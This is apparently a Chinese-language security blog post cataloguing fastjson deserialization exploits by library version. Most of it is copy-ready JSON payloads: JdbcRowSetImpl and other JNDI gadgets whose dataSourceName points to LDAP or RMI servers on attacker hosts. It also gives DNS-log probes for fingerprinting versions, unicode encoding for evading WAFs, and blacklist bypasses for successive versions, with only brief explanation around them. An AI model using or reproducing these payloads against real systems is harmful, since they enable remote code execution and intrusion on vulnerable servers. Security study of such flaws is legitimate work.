---
layout: post
author: r3tree
title: "[分享] fastjson反序列化漏洞全版本总结"
date: 2024-04-11
music-id: 
permalink: /archives/2024-04-11/1
description: "对fastjson反序列化漏洞的学习"
categories: "网络安全"
tags: [java, fastjson]
---

常用方法parse()、parseObject()、parseArray() 。每个方法又有几个重载方法，带有不同参数，具体请查看源码。其中： 类的类型：java.lang.reflect.Type。可以使用@type指定反序列化任意类
```bash
1. 使用JSON.parse(jsonString)和JSON.parseObject(jsonString,Target.class)，两者调用链一致，parse会在jsonString中解析字符串获取@type指定的类，parseObject会直接使用参数中的class
2. 使用JSON.parseObject(jsonString)将会返回JSONObeject对象，并且类中的set&&get方法都会被调用(指定@type的情况下)
3. fastjson在为类属性寻找get/set方法时，调用com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_|-字符串，也就是说就算字段名为_ag_e，getter方法为getAge(),fastjson也可以找到，
```
## 鉴别jackson
如果目标回显详细报错信息，稍微破坏一下json结构，比如多一个{，比如把{}变成a。就可以看出是不是jackson。  
如果目标不回显详细报错信息，而是只有一个500或者error，那么jackson不允许存在不相关的键值，fastjson允许这个特性就可以派上用场了。

## 延迟判断
适用于1.2.47之前版本的fastjson，这里面有一个小技巧，访问一个不常见的外网IP地址，会延迟几秒，访问一个内网地址127.0.0.1 会瞬间返回，那么证明这个POC可用，也间接证明fastjson版本是1.2.47之前的版本。那么在不出网的情况下，可以借助这个POC的延迟效果，知道目标fastjson是<=1.2.47的
```json
{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://11.111.22.222/test111","autoCommit":true}}

编码前：
{
  "name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
  "x":{ "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://11.111.22.222/test111",
        "autoCommit":true}
}
```

延迟证明fastjson版本号1.1.16<=version<=1.2.24
```json
{
   "b":{" @type":"com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName":"ldap://137.30.0.1:7777/POC",
          "autoCommit":true}
}
```
## 异常回显 fastjson 精确版本号 删除尾部大括号
```json
{
"@type": "java.lang.AutoCloseable"
```
## dns探测
fastjson <1.2.43
```json
{"@type":"java.net.URL","val":"h删ttp://dnslog"}
{删斜杠\{"@type":"java.net.URL","val":"h删ttp://dnslog"删斜杠\}:"x"}
```
fastjson <1.2.48
```json
{"@type":"java.net.InetAddress","val":"dnslog"}
```
fastjson <1.2.68
```json
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{删斜杠\{"@type":"java.net.URL","val":"dnslog"删斜杠\}:"aaa"}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"h删ttp://dnslog"}}""}
Set[{"@type":"java.net.URL","val":"h删ttp://dnslog"}]
Set[{"@type":"java.net.URL","val":"h删ttp://dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{删斜杠\{"@type":"java.net.URL","val":"h删ttp://dnslog"}:0
```
精确探索autoType是否开启
```json
[{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"ydk3cz.dnslog.cn"}]
```

# 各版本payload
## Fastjson<=1.2.24
TemplatesImpl类利用链:   
getOutputProperties() -> newTransformer() -> getTransletInstance() -> defineTransletClasses() -> EvilClass.newInstance()
## 1.2.25<=Fastjson<=1.2.41
引入了checkAutoType安全机制，默认关闭   
如果开启autoType，则会先校验白名单，白名单存在就使用typeUtils.loadClass加载，再匹配黑名单  
如果关闭autoType，则会先匹配黑名单，再匹配白名单  
如果开启autoType，使用typeUtils.loadClass加载  

L和;绕过
```json
{
   "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
   "dataSourceName":"rmi://127.0.0.1:1099/vulClass",
   "autoCommit":true
}
```
## Fastjson1.2.42
双写L和;绕过
```json
{
   "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
   "dataSourceName":"rmi://127.0.0.1:1099/VulClass",
   "autoCommit":true
}
```
## 1.2.25<=Fastjson<=1.2.43
[{绕过
```json
{
   "@type": "[com.sun.rowset.JdbcRowSetImpl"[{,
   "dataSourceName": "ldap://127.0.0.1:1389/VulClass",
   "autoCommit": true"
}
```
## 1.2.25<=Fastjson<=1.2.45
通过不在黑名单里面的类来绕过
```json
{
   "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
   "properties":{"data_source":"ldap://127.0.0.1:1389/VulClass"}
}
```
## 1.2.25<=Fastjson<=1.2.47
双重json绕过了`autoTypeSupport`检测
```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://127.0.0.1:1389/VulClass",
        "autoCommit": true
    }
}
```
## Fastjson=1.2.62
`CVE-2020-8840`的gadget绕过fastjson黑名单
```json
{
   "@type":"org.apache.xbean.propertyeditor.JndiConverter",
   "AsText":"ldap://x.x.x.x/Exp"
}
```
## Fastjson=1.2.66
绕过黑名单
```json
{
   "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
   "jndiNames":"ldap://x.x.x.x/Exp"
}
```
## Fastjson=1.2.68
`checkAutoType`代码限制，JNDI注入的类基本都被拦截了

## bypasswaf
大量字符绕过 WAF, unicode或十六进制编码
## FastJson漏洞链特点
在反序列化时，parse触发了set方法，parseObject同时触发了set和get方法，由于存在这种`autoType`特性。如果`@type`标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞。

FastJson反序列化和原生反序列化利用不同的点：
1. FastJson不需要实现Serializable
2. 不需要变量不是transient/可控变量：
   a. 变量有对应的setter
   b. 或是public/static
   c. 或满足条件的getter
3. 反序列化入口点不是readObject，而是setter或者是getter
4. 执行点是相同的：反射或者类加载

> 参考文章1 [Fastjson各版本漏洞分析](https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/04.Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)    
> 参考文章2 [fastjson反序列化漏洞区分版本号的方法总结](https://www.cnblogs.com/forforever/p/16537846.html)
> 参考文章3 [全版本fastjson反序列化漏洞分析](https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E5%B0%86json%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%BA%E7%B1%BB)  
> 参考文章4 [Java反序列化之FastJson反序列化及绕过](https://xz.aliyun.com/t/12728?time__1311=GqGxu7G%3DiQdmqGN4CxUxYTSFTG8CdHqaW4D#toc-5)